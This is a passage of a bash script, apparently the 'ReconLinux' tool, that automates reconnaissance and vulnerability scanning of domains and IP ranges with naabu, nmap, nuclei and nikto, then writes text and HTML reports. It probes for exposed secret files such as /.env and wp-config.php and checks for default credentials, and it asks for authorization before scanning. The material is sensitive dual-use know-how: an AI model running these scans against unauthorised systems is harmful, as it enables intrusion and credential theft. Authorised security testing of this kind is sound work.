    echo -e "${BOLD}${clr}  ▶ $label ($(count_lines "$f") findings)${NC}"
    echo -e "${clr}  File: $f${NC}"
    # Print every finding line (up to 50)
    local n=0
    while IFS= read -r line && [[ $n -lt 50 ]]; do
      echo -e "    ${WHITE}$line${NC}"
      (( n++ )) || true
    done < "$f"
    [[ $n -eq 50 ]] && echo -e "    ${YELLOW}  … ($(count_lines "$f") total — see file for full list)${NC}"
    echo ""
  done
  $crit_found || echo -e "  ${GREEN}No confirmed critical vulnerabilities.${NC}"

  # ── 4. INFORMATIONAL findings ───────────────────────────────────────
  echo -e "${BOLD}${YELLOW}  ── INFORMATIONAL ──────────────────────────────────${NC}"
  echo ""

  local INFO_FILES=(
    "sensitive_files.txt:Sensitive Files Exposed"
    "admin_panels.txt:Admin Panels Discovered"
    "missing_headers.txt:Missing Security Headers"
    "nuclei.txt:Nuclei Findings"
    "nuclei_cves.txt:Nuclei CVEs"
    "nuclei_misconfig.txt:Nuclei Misconfigs"
    "nuclei_exposures.txt:Nuclei Exposures"
    "nuclei_default-logins.txt:Default Logins"
    "idor_test_urls.txt:IDOR Test URLs (manual verify)"
    "ssrf_probes.txt:SSRF Probe URLs (check callback)"
    "sqlmap:SQLmap Results (dir)"
  )

  for entry in "${INFO_FILES[@]}"; do
    fname="${entry%%:*}"
    label="${entry##*:}"
    f="$vuln_dir/$fname"
    # handle both files and directories
    if [[ -f "$f" ]] && [[ -s "$f" ]]; then
      echo -e "  ${YELLOW}▶ $label${NC} — $(count_lines "$f") lines"
      echo -e "    ${CYAN}File: $f${NC}"
      local n=0
      while IFS= read -r line && [[ $n -lt 20 ]]; do
        echo -e "    $line"
        (( n++ )) || true
      done < "$f"
      [[ $n -eq 20 ]] && echo -e "    ${YELLOW}  … see $f for full list${NC}"
      echo ""
    elif [[ -d "$f" ]]; then
      echo -e "  ${YELLOW}▶ $label${NC} — directory"
      echo -e "    ${CYAN}Dir: $f${NC}"
      echo ""
    fi
  done

  # ── 5. JS secrets ───────────────────────────────────────────────────
  local js_sec="$OUT/js/js_secrets.txt"
  if [[ -f "$js_sec" ]] && [[ -s "$js_sec" ]]; then
    echo -e "${BOLD}${RED}  ▶ JS SECRET CANDIDATES ($(count_lines "$js_sec") hits)${NC}"
    echo -e "  ${CYAN}File: $js_sec${NC}"
    head -20 "$js_sec" | while IFS= read -r line; do echo -e "    ${RED}$line${NC}"; done
    [[ $(count_lines "$js_sec") -gt 20 ]] && \
      echo -e "    ${YELLOW}… see $js_sec for full list${NC}"
    echo ""
  fi

  # ── 6. Output directory tree ─────────────────────────────────────────
  echo -e "${BOLD}${BLUE}  ── OUTPUT FILES ───────────────────────────────────${NC}"
  echo -e "  ${WHITE}Root : $OUT${NC}"
  for subdir in subdomains urls js params ports fuzzing vulns; do
    d="$OUT/$subdir"
    [[ -d "$d" ]] || continue
    count=$(find "$d" -maxdepth 1 -type f 2>/dev/null | wc -l)
    echo -e "  ${CYAN}├── $subdir/${NC}  ($count files)"
    find "$d" -maxdepth 1 -type f -name "*.txt" -o -name "*.json" 2>/dev/null \
      | sort \
      | while IFS= read -r f; do
          lines=$(wc -l < "$f" 2>/dev/null || echo 0)
          [[ $lines -gt 0 ]] && printf "  │   %-45s  %s lines\n" "$(basename "$f")" "$lines"
        done
  done
  echo ""
  echo -e "${BOLD}${GREEN}  ╔══════════════════════════════════════════════════╗${NC}"
  echo -e "${BOLD}${GREEN}  ║  Plain report : $report${NC}"
  echo -e "${BOLD}${GREEN}  ╚══════════════════════════════════════════════════╝${NC}"
  echo ""

  # ── HTML Report ─────────────────────────────────────────────
  local html_report="$OUT/report.html"
  {
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    echo "<title>Recon Report — $DOMAIN</title>"
    echo "<style>
      body{font-family:monospace;background:#1a1a2e;color:#e0e0e0;margin:20px}
      h1{color:#00d4ff}h2{color:#f39c12;border-bottom:1px solid #333;padding-bottom:4px}
      h3{color:#e74c3c}.ok{color:#2ecc71}.warn{color:#f39c12}.crit{color:#e74c3c}
      pre{background:#0d0d1a;padding:10px;border-left:3px solid #00d4ff;white-space:pre-wrap;word-break:break-all}
      .stat{display:inline-block;background:#0d0d1a;padding:6px 12px;margin:4px;border-radius:4px}
      .badge-crit{background:#c0392b;color:#fff;padding:2px 8px;border-radius:3px}
      .badge-info{background:#2980b9;color:#fff;padding:2px 8px;border-radius:3px}
    </style></head><body>"
    echo "<h1>&#x1F4E1; Recon Report — $DOMAIN</h1>"
    echo "<p>Generated: $(date)</p>"

    echo "<h2>Stats</h2>"
    echo "<span class='stat'>Subdomains: $(count_lines "$OUT/subdomains/all_subdomains.txt")</span>"
    echo "<span class='stat'>Live Domains: $(count_lines "$OUT/live_domains.txt")</span>"
    echo "<span class='stat'>Total URLs: $(count_lines "$OUT/urls/all_urls.txt")</span>"
    echo "<span class='stat'>Param URLs: $(count_lines "$OUT/params/all_param_urls.txt")</span>"
    [[ -f "$OUT/waf.txt" ]] && echo "<span class='stat warn'>WAF: $(cat "$OUT/waf.txt")</span>"

    echo "<h2>&#x1F6A8; Confirmed Vulnerabilities</h2>"
    local CRIT_HTML=(
      "sqli_errors.txt:SQLi Error-Based"
      "sqli_blind.txt:SQLi Blind"
      "lfi_hits.txt:LFI / Path Traversal"
      "ssti_hits.txt:SSTI"
      "cmdi_hits.txt:Command Injection"
      "dalfox_confirmed.txt:XSS (dalfox)"
      "xss_reflected_probe.txt:XSS Reflected"
      "open_redirects.txt:Open Redirect"
      "cors.txt:CORS"
      "takeovers.txt:Subdomain Takeover"
      "crlf_hits.txt:CRLF Injection"
      "smuggling_hits.txt:HTTP Smuggling"
      "jwt_hits.txt:JWT"
      "trufflehog_hits.txt:Secrets"
      "cloud_assets.txt:Cloud Assets"
      "graphql_introspection.txt:GraphQL Introspection"
      "actuator_endpoints.txt:Spring Actuator"
    )
    local any_html=false
    for entry in "${CRIT_HTML[@]}"; do
      local fn="${entry%%:*}" lbl="${entry##*:}"
      local f="$vuln_dir/$fn"
      [[ -f "$f" && -s "$f" ]] || continue
      any_html=true
      echo "<h3><span class='badge-crit'>$lbl</span> — $(count_lines "$f") findings</h3>"
      echo "<pre>"
      head -30 "$f" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'
      [[ $(count_lines "$f") -gt 30 ]] && echo "... ($(count_lines "$f") total, see $f)"
      echo "</pre>"
    done
    $any_html || echo "<p class='ok'>No confirmed critical vulnerabilities.</p>"

    echo "<h2>&#x2139; Informational</h2>"
    local INFO_HTML=(
      "sensitive_files.txt:Sensitive Files"
      "admin_panels.txt:Admin Panels"
      "missing_headers.txt:Missing Headers"
      "nuclei.txt:Nuclei"
      "tls_issues.txt:TLS Issues"
      "wpscan.txt:WPScan"
      "gitleaks.json:Gitleaks"
    )
    for entry in "${INFO_HTML[@]}"; do
      local fn="${entry%%:*}" lbl="${entry##*:}"
      local f="$vuln_dir/$fn"
      [[ -f "$f" && -s "$f" ]] || continue
      echo "<h3><span class='badge-info'>$lbl</span> — $(count_lines "$f") lines</h3>"
      echo "<pre>"
      head -20 "$f" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'
      echo "</pre>"
    done

    echo "<h2>&#x1F4C1; Output Files</h2><pre>"
    find "$OUT" -maxdepth 2 -type f \( -name "*.txt" -o -name "*.json" \) 2>/dev/null \
      | sort | while IFS= read -r f; do
          local lines; lines=$(wc -l < "$f" 2>/dev/null || echo 0)
          [[ $lines -gt 0 ]] && printf "%-60s  %s lines\n" "${f#$OUT/}" "$lines"
        done
    echo "</pre>"
    echo "</body></html>"
  } > "$html_report" 2>/dev/null
  success "HTML report → $html_report"

  # ── Notifications ────────────────────────────────────────────
  local crit_count=0
  for entry in "${CRITICAL_FILES[@]}"; do
    local fn="${entry%%:*}"
    [[ -f "$vuln_dir/$fn" && -s "$vuln_dir/$fn" ]] && (( crit_count++ )) || true
  done
  local notify_msg="[ReconLinux] Scan of $DOMAIN complete. ${crit_count} critical finding files. Output: $OUT"
  if [[ -n "$SLACK_URL" || -n "$DISCORD_URL" ]]; then
    notify "$notify_msg"
    success "Notification sent"
  fi

  success "Scan complete. Results saved to: $OUT"
}

# ═══════════════════════════════════════════════════════════
#  IP SCAN MODE
# ═══════════════════════════════════════════════════════════

# ── IP Phase 1: Expand CIDR / validate target ───────────────
ip_phase1_expand() {
  phase "IP SCAN — Phase 1: Target Expansion"
  local ip_dir="$OUT/ips"
  local ip_list="$ip_dir/targets.txt"

  if echo "$TARGET_IP" | grep -qP '^[\d.]+/\d+$'; then
    info "CIDR detected: $TARGET_IP — expanding …"
    if command -v mapcidr &>/dev/null; then
      mapcidr -cidr "$TARGET_IP" -silent 2>/dev/null > "$ip_list"
    else
      python3 -c "
import ipaddress, sys
net = ipaddress.ip_network('$TARGET_IP', strict=False)
for ip in net.hosts(): print(ip)
" > "$ip_list" 2>/dev/null || true
    fi
    success "Expanded $(count_lines "$ip_list") IPs from $TARGET_IP"
  else
    echo "$TARGET_IP" > "$ip_list"
    success "Single IP target: $TARGET_IP"
  fi

  # Reverse DNS
  if command -v dnsx &>/dev/null; then
    info "Reverse DNS lookup (PTR) …"
    dnsx -l "$ip_list" -ptr $SILENT -r "$RESOLVERS" \
      -o "$ip_dir/rdns.txt" 2>/dev/null || true
    [[ -s "$ip_dir/rdns.txt" ]] \
      && success "PTR records: $(count_lines "$ip_dir/rdns.txt")" \
      || info "No PTR records found"
  fi
}

# ── IP Phase 2: Port Scan ───────────────────────────────────
ip_phase2_ports() {
  phase "IP SCAN — Phase 2: Port Scanning"
  local ip_list="$OUT/ips/targets.txt"
  local ports_dir="$OUT/ports"

  # naabu — fast full port scan
  if command -v naabu &>/dev/null; then
    info "naabu: full port scan (1-65535) …"
    naabu -l "$ip_list" \
      -p - \
      -silent \
      -rate 1000 \
      -o "$ports_dir/naabu_full.txt" 2>/dev/null \
      && success "naabu: $(count_lines "$ports_dir/naabu_full.txt") open ports"
  fi

  # nmap — service/version scan on discovered ports
  if command -v nmap &>/dev/null; then
    local nmap_port_arg
    if [[ -s "$ports_dir/naabu_full.txt" ]]; then
      local port_list
      port_list=$(awk -F: '{print $NF}' "$ports_dir/naabu_full.txt" 2>/dev/null \
        | sort -un | tr '\n' ',' | sed 's/,$//')
      nmap_port_arg="-p $port_list"
      info "nmap: service scan on discovered ports …"
    else
      nmap_port_arg="--top-ports 1000"
      info "nmap: service scan on top 1000 ports …"
    fi

    # shellcheck disable=SC2086
    nmap -sV -sC -O \
      $nmap_port_arg \
      --open \
      --max-retries 2 \
      --host-timeout 120s \
      -iL "$ip_list" \
      -oN "$ports_dir/nmap_ip.txt" \
      -oX "$ports_dir/nmap_ip.xml" \
      2>/dev/null \
      && success "nmap done → $ports_dir/nmap_ip.txt"

    grep -E "^[0-9]+/tcp.*open" "$ports_dir/nmap_ip.txt" 2>/dev/null \
      > "$ports_dir/open_services.txt" || true
    [[ -s "$ports_dir/open_services.txt" ]] \
      && success "Open services: $(count_lines "$ports_dir/open_services.txt") entries"
  fi

  # Banner grab via nmap NSE
  if command -v nmap &>/dev/null && [[ -s "$ports_dir/naabu_full.txt" ]]; then
    info "Banner grabbing with nmap NSE …"
    local banner_ports
    banner_ports=$(awk -F: '{print $NF}' "$ports_dir/naabu_full.txt" 2>/dev/null \
      | sort -un | tr '\n' ',' | sed 's/,$//')
    nmap -sV \
      --script=banner,http-title,ssh-hostkey,ftp-anon,smtp-commands,ssl-cert \
      -p "$banner_ports" \
      --open \
      -iL "$ip_list" \
      -oN "$ports_dir/nmap_banners.txt" \
      2>/dev/null || true
    success "Banners → $ports_dir/nmap_banners.txt"
  fi
}

# ── IP Phase 3: HTTP Service Discovery ─────────────────────
ip_phase3_http() {
  phase "IP SCAN — Phase 3: HTTP Service Discovery"
  local ports_dir="$OUT/ports"
  local http_dir="$OUT/http"

  if [[ -s "$ports_dir/naabu_full.txt" ]] && command -v httpx &>/dev/null; then
    info "Probing all open ports for HTTP services …"
    httpx -l "$ports_dir/naabu_full.txt" \
      $SILENT \
      -status-code -title -tech-detect -content-length -web-server \
      -threads "$THREADS" \
      -o "$http_dir/httpx_ip.txt" 2>"$REDIR"
  else
    # Fallback: probe common web ports on all IPs
    info "Generating HTTP candidates on common web ports …"
    local WEB_PORTS=(80 443 8080 8443 8000 8008 8888 9090 9443 3000 4000 5000)
    > "$http_dir/candidates.txt"
    while IFS= read -r ip; do
      for port in "${WEB_PORTS[@]}"; do
        local scheme="http"
        [[ "$port" == "443" || "$port" == "8443" || "$port" == "9443" ]] && scheme="https"
        echo "${scheme}://${ip}:${port}"
      done
    done < "$OUT/ips/targets.txt" > "$http_dir/candidates.txt"

    if command -v httpx &>/dev/null; then
      httpx -l "$http_dir/candidates.txt" \
        $SILENT \
        -status-code -title -tech-detect \
        -threads "$THREADS" \
        -o "$http_dir/httpx_ip.txt" 2>"$REDIR"
    fi
  fi

  awk '{print $1}' "$http_dir/httpx_ip.txt" 2>/dev/null \
    | sort -u > "$http_dir/live_http_urls.txt"
  success "HTTP services found: $(count_lines "$http_dir/live_http_urls.txt")"

  if [[ -s "$http_dir/httpx_ip.txt" ]]; then
    info "Technology fingerprints:"
    grep -oP '\[.*?\]' "$http_dir/httpx_ip.txt" 2>/dev/null \
      | sort | uniq -c | sort -rn | head -20 || true
    grep -oP '\[.*?\]' "$http_dir/httpx_ip.txt" 2>/dev/null \
      | tr -d '[]' | tr ',' '\n' | sort -u > "$OUT/detected_tech.txt" 2>/dev/null || true
  fi
}

# ── IP Phase 4: Vulnerability Scanning ─────────────────────
ip_phase4_vulns() {
  phase "IP SCAN — Phase 4: Vulnerability Scanning"
  local vuln_dir="$OUT/vulns"
  local http_dir="$OUT/http"
  local live_http="$http_dir/live_http_urls.txt"

  # 4a. Nuclei on HTTP services
  if command -v nuclei &>/dev/null && [[ -s "$live_http" ]]; then
    info "Running nuclei on HTTP services …"
    nuclei -l "$live_http" \
      -severity critical,high,medium \
      $SILENT \
      -rate-limit 50 \
      -bulk-size 25 \
      -o "$vuln_dir/nuclei_ip.txt" 2>"$REDIR" \
      && success "nuclei: $(count_lines "$vuln_dir/nuclei_ip.txt") findings"

    for tag in cves misconfig exposures default-logins; do
      nuclei -l "$live_http" \
        -tags "$tag" $SILENT \
        -rate-limit 30 \
        -o "$vuln_dir/nuclei_ip_${tag}.txt" 2>"$REDIR" || true
      [[ -s "$vuln_dir/nuclei_ip_${tag}.txt" ]] \
        && found "nuclei[$tag]: $(count_lines "$vuln_dir/nuclei_ip_${tag}.txt") findings"
    done
  fi

  # 4b. Nmap vuln scripts
  if command -v nmap &>/dev/null && [[ -s "$OUT/ips/targets.txt" ]]; then
    info "Running nmap vuln scripts …"
    nmap --script=vuln,auth \
      --script-timeout 60s \
      -iL "$OUT/ips/targets.txt" \
      -oN "$vuln_dir/nmap_vulns.txt" \
      2>/dev/null || true
    success "nmap vuln scripts → $vuln_dir/nmap_vulns.txt"
  fi

  # 4c. Nikto on HTTP services (first 5)
  if command -v nikto &>/dev/null && [[ -s "$live_http" ]]; then
    info "Running nikto on HTTP services (first 5) …"
    head -5 "$live_http" | while IFS= read -r url; do
      local safe_name
      safe_name=$(echo "$url" | sed 's|https\?://||;s|[/:.]|_|g')
      nikto -h "$url" -nointeractive \
        -output "$vuln_dir/nikto_ip_${safe_name}.txt" \
        2>/dev/null || true
    done
    success "nikto done"
  fi

  # 4d. Sensitive file exposure
  if [[ -s "$live_http" ]]; then
    info "Probing for sensitive files …"
    local sens_out="$vuln_dir/ip_sensitive_files.txt"
    > "$sens_out"
    local SENSITIVE=(
      "/.git/HEAD" "/.env" "/phpinfo.php" "/info.php" "/server-status"
      "/swagger.json" "/openapi.json" "/api-docs" "/actuator" "/actuator/env"
      "/wp-config.php" "/config.php" "/web.config" "/adminer.php"
      "/phpmyadmin/" "/.htaccess" "/backup.zip" "/db.sql"
    )
    while IFS= read -r base_url; do
      for path in "${SENSITIVE[@]}"; do
        local url="${base_url%/}${path}"
        local code
        code=$(curl -sk --max-time "$TIMEOUT" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        if [[ "$code" == "200" || "$code" == "403" ]]; then
          echo "[$code] $url" >> "$sens_out"
          [[ "$code" == "200" ]] && warn "[$code] $url"
        fi
      done
    done < <(head -10 "$live_http")
    [[ -s "$sens_out" ]] \
      && found "Sensitive files → $sens_out ($(count_lines "$sens_out") hits)" \
      || success "No sensitive files found"
  fi

  # 4e. Default credentials check (nmap NSE)
  if command -v nmap &>/dev/null && [[ -s "$OUT/ips/targets.txt" ]]; then
    info "Checking default credentials via nmap NSE …"
    nmap --script=http-default-accounts,ftp-anon,ftp-bounce \
      --script-args brute.firstonly=true \
      -iL "$OUT/ips/targets.txt" \
      -oN "$vuln_dir/ip_default_creds.txt" \
      2>/dev/null || true
    success "Default creds check → $vuln_dir/ip_default_creds.txt"
  fi
}

# ── IP Phase 5: Report ──────────────────────────────────────
ip_phase5_report() {
  phase "IP SCAN — Phase 5: Report"
  local report="$OUT/IP_SCAN_SUMMARY.txt"
  local vuln_dir="$OUT/vulns"
  local ports_dir="$OUT/ports"
  local http_dir="$OUT/http"

  {
    echo "======================================================"
    echo "  IP SCAN SUMMARY — $TARGET_IP"
    echo "  $(date)"
    echo "======================================================"

    echo ""
    echo "  ── TARGETS ──"
    printf "  %-24s : %s\n" "IP/CIDR"        "$TARGET_IP"
    printf "  %-24s : %s\n" "Expanded IPs"   "$(count_lines "$OUT/ips/targets.txt")"
    printf "  %-24s : %s\n" "PTR records"    "$(count_lines "$OUT/ips/rdns.txt")"

    echo ""
    echo "  ── PORT SCAN ──"
    printf "  %-24s : %s\n" "Open ports (naabu)"   "$(count_lines "$ports_dir/naabu_full.txt")"
    printf "  %-24s : %s\n" "Open services (nmap)"  "$(count_lines "$ports_dir/open_services.txt")"

    echo ""
    echo "  ── HTTP SERVICES ──"
    printf "  %-24s : %s\n" "Live HTTP endpoints"  "$(count_lines "$http_dir/live_http_urls.txt")"

    echo ""
    echo "  ── VULNERABILITY FINDINGS ──"
    local VULN_FILES=(
      "nuclei_ip.txt:Nuclei findings"
      "nuclei_ip_cves.txt:Nuclei CVEs"
      "nuclei_ip_misconfig.txt:Nuclei misconfigs"
      "nuclei_ip_exposures.txt:Nuclei exposures"
      "nuclei_ip_default-logins.txt:Default logins"
      "nmap_vulns.txt:Nmap vuln scripts"
      "ip_default_creds.txt:Default credentials"
      "ip_sensitive_files.txt:Sensitive files"
    )
    local any_found=false
    for entry in "${VULN_FILES[@]}"; do
      local fname="${entry%%:*}" label="${entry##*:}"
      local f="$vuln_dir/$fname"
      if [[ -f "$f" && -s "$f" ]]; then
        any_found=true
        printf "  [FOUND] %-28s : %s lines — %s\n" "$label" "$(count_lines "$f")" "$f"
      fi
    done
    $any_found || echo "  No findings recorded."

    echo ""
    echo "[OUTPUT DIRECTORY]"
    echo "  $OUT"
    echo ""
    echo "======================================================"
  } > "$report"

  echo ""
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${WHITE}  IP SCAN COMPLETE — $TARGET_IP${NC}"
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo ""
  echo -e "${CYAN}  Expanded IPs   :${NC} $(count_lines "$OUT/ips/targets.txt")"
  echo -e "${CYAN}  Open ports     :${NC} $(count_lines "$ports_dir/naabu_full.txt")"
  echo -e "${CYAN}  HTTP services  :${NC} $(count_lines "$http_dir/live_http_urls.txt")"
  echo ""

  echo -e "${BOLD}${RED}  ╔══════════════════════════════════════════════════╗${NC}"
  echo -e "${BOLD}${RED}  ║           IP SCAN FINDINGS                       ║${NC}"
  echo -e "${BOLD}${RED}  ╚══════════════════════════════════════════════════╝${NC}"
  echo ""

  local CRIT_FILES=(
    "nuclei_ip.txt:Nuclei Findings:RED"
    "nuclei_ip_cves.txt:CVEs:RED"
    "nmap_vulns.txt:Nmap Vulns:RED"
    "ip_default_creds.txt:Default Credentials:RED"
    "ip_sensitive_files.txt:Sensitive Files:YELLOW"
  )

  local crit_found=false
  for entry in "${CRIT_FILES[@]}"; do
    IFS=':' read -r fname label color <<< "$entry"
    local f="$vuln_dir/$fname"
    [[ -f "$f" && -s "$f" ]] || continue
    crit_found=true
    local clr="${RED}"
    [[ "$color" == "YELLOW" ]] && clr="${YELLOW}"
    echo -e "${BOLD}${clr}  ▶ $label ($(count_lines "$f") findings)${NC}"
    echo -e "${clr}  File: $f${NC}"
    local n=0
    while IFS= read -r line && [[ $n -lt 30 ]]; do
      echo -e "    ${WHITE}$line${NC}"
      (( n++ )) || true
    done < "$f"
    [[ $n -eq 30 ]] && echo -e "    ${YELLOW}  … ($(count_lines "$f") total — see file)${NC}"
    echo ""
  done
  $crit_found || echo -e "  ${GREEN}No confirmed findings.${NC}"

  success "Summary → $report"
}

# ── IP scan pipeline ────────────────────────────────────────
scan_ip() {
  local safe_target
  safe_target=$(echo "$TARGET_IP" | tr '/.' '__')
  OUT="$OUT_DIR/ip_${safe_target}"
  mkdir -p "$OUT" "$OUT/ips" "$OUT/ports" "$OUT/http" "$OUT/vulns"

  if $DRY_RUN; then
    warn "[DRY-RUN] Would IP-scan: $TARGET_IP → $OUT"
    return 0
  fi

  make_resolvers
  ip_phase1_expand
  ip_phase2_ports
  ip_phase3_http
  ip_phase4_vulns
  ip_phase5_report

  echo -e "\n${GREEN}${BOLD}[✓] IP scan complete! → $OUT${NC}\n"
}

# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════
scan_single() {
  # Runs the full pipeline for a single $DOMAIN value
  OUT="$OUT_DIR/$DOMAIN"
  mkdir -p "$OUT"
  mkdir -p "$OUT/subdomains" "$OUT/urls" "$OUT/js" \
           "$OUT/params"     "$OUT/vulns" "$OUT/ports" \
           "$OUT/screenshots" "$OUT/fuzzing"

  if $DRY_RUN; then
    warn "[DRY-RUN] Would scan: $DOMAIN → $OUT"
    warn "[DRY-RUN] Phases: subdomains, live, urls, js, params, ports, fuzz, vulns, report"
    return 0
  fi

  make_resolvers
  phase1_subdomains
  phase2_live
  phase3_urls
  phase4_js
  phase5_params
  phase6_ports
  phase7_fuzz
  phase8_vulns
  phase9_report

  echo -e "\n${GREEN}${BOLD}[✓] Scan complete! → $OUT${NC}\n"
}

main() {
  banner

  echo -e "${YELLOW}${BOLD}"
  echo "  ══════════════════════════════════════════════════"
  echo "   LEGAL NOTICE: Only scan systems you own or have"
  echo "   EXPLICIT WRITTEN permission to test."
  echo "   Unauthorized scanning is ILLEGAL."
  echo "  ══════════════════════════════════════════════════"
  echo -e "${NC}"

  $DRY_RUN && warn "DRY-RUN mode enabled — no requests will be made"

  check_and_install_tools

  if $IP_MODE; then
    if ! $DRY_RUN; then
      read -rp "  Do you have authorization to scan $TARGET_IP? [y/N]: " confirm
      [[ "${confirm,,}" != "y" ]] && { error "Aborted."; exit 1; }
    fi
    scan_ip
  elif [[ -n "$TARGETS_FILE" ]]; then
    [[ ! -f "$TARGETS_FILE" ]] && { error "Targets file not found: $TARGETS_FILE"; exit 1; }
    local total_targets
    total_targets=$(grep -c . "$TARGETS_FILE" 2>/dev/null || echo 0)
    info "Multi-target mode: $total_targets domains from $TARGETS_FILE"
    local _t=0
    while IFS= read -r target; do
      [[ -z "$target" || "$target" == \#* ]] && continue
      (( _t++ )) || true
      DOMAIN="$target"
      echo ""
      phase "TARGET $_t/$total_targets — $DOMAIN"
      if ! $DRY_RUN; then
        read -rp "  Authorize scan of $DOMAIN? [y/N]: " confirm
        [[ "${confirm,,}" != "y" ]] && { warn "Skipping $DOMAIN"; continue; }
      fi
      scan_single
    done < "$TARGETS_FILE"
  else
    if ! $DRY_RUN; then
      read -rp "  Do you have authorization to scan $DOMAIN? [y/N]: " confirm
      [[ "${confirm,,}" != "y" ]] && { error "Aborted."; exit 1; }
    fi
    scan_single
  fi
}

main
